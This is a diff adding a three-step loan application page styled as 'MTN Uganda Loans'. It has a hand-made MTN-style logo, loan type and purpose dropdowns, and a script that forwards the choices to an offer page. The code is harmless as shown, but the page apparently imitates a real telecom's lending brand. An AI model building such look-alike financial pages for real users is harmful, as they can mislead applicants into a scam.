@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply - MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer;
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+        .card h1 {
+            font-size: 26px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 16px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 70px; border-radius: 3px; background: #e0e0e0; }
+        .progress .bar.active { background: #ffcc00; }
+
+        .form-group { margin-bottom: 22px; }
+        .form-group label {
+            display: block; font-size: 14px; font-weight: 700;
+            color: #333; margin-bottom: 8px;
+        }
+        .form-group select, .form-group input {
+            width: 100%; padding: 14px 16px;
+            font-size: 15px; font-family: inherit; color: #111;
+            border: 1.5px solid #ddd; border-radius: 10px;
+            background: #fff; outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group select:focus, .form-group input:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+        }
+
+        .amount-display {
+            text-align: center;
+            padding: 20px;
+            background: #fffef8;
+            border: 1.5px solid #ffcc00;
+            border-radius: 12px;
+            margin-bottom: 22px;
+        }
+        .amount-display .label {
+            font-size: 12px; color: #888; text-transform: uppercase;
+            letter-spacing: 1px; margin-bottom: 6px;
+        }
+        .amount-display .value {
+            font-size: 30px; font-weight: 900; color: #d4a000;
+        }
+
+        .btn-group { display: flex; gap: 14px; margin-top: 32px; }
+        .prev-btn, .next-btn {
+            flex: 1; padding: 16px; font-size: 15px; font-weight: 800;
+            letter-spacing: 1px; border-radius: 10px; cursor: pointer;
+            text-transform: uppercase; text-align: center;
+            text-decoration: none; display: inline-block;
+            transition: background 0.2s;
+            border: none;
+        }
+        .prev-btn { background: #f0f0f0; color: #333; }
+        .prev-btn:hover { background: #e0e0e0; }
+        .next-btn { background: #ffcc00; color: #111; }
+        .next-btn:hover { background: #e6b800; }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .progress .bar { width: 55px; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="index.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Loan Application</h1>
+            <p class="step-text">Step 1 of 3</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+
+            <div class="amount-display">
+                <div class="label">Selected Amount</div>
+                <div class="value" id="amountDisplay">UGX 500,000</div>
+            </div>
+
+            <form id="applyForm">
+                <div class="form-group">
+                    <label for="loanType">Loan Type</label>
+                    <select id="loanType">
+                        <option value="personal">Personal Loan</option>
+                        <option value="business">Business Loan</option>
+                        <option value="emergency">Emergency Loan</option>
+                        <option value="education">Education Loan</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="purpose">Purpose of Loan</label>
+                    <select id="purpose">
+                        <option value="fee">School Fees</option>
+                        <option value="business">Business Capital</option>
+                        <option value="medical">Medical Expenses</option>
+                        <option value="rent">Rent / Housing</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+            </form>
+
+            <div class="btn-group">
+                <a href="index.html" class="prev-btn">Previous</a>
+                <a href="#" class="next-btn" id="nextBtn">Next Step</a>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const amount = Number(params.get('amount') || 500000);
+        const term   = params.get('term') || '12';
+
+        document.getElementById('amountDisplay').textContent =
+            'UGX ' + amount.toLocaleString();
+
+        document.getElementById('nextBtn').addEventListener('click', function () {
+            const data = new URLSearchParams({
+                amount: amount,
+                term: term,
+                loanType: document.getElementById('loanType').value,
+                purpose: document.getElementById('purpose').value
+            });
+            window.location.href = 'offer.html?' + data.toString();
+        });
+    </script>
+</body>
+</html>
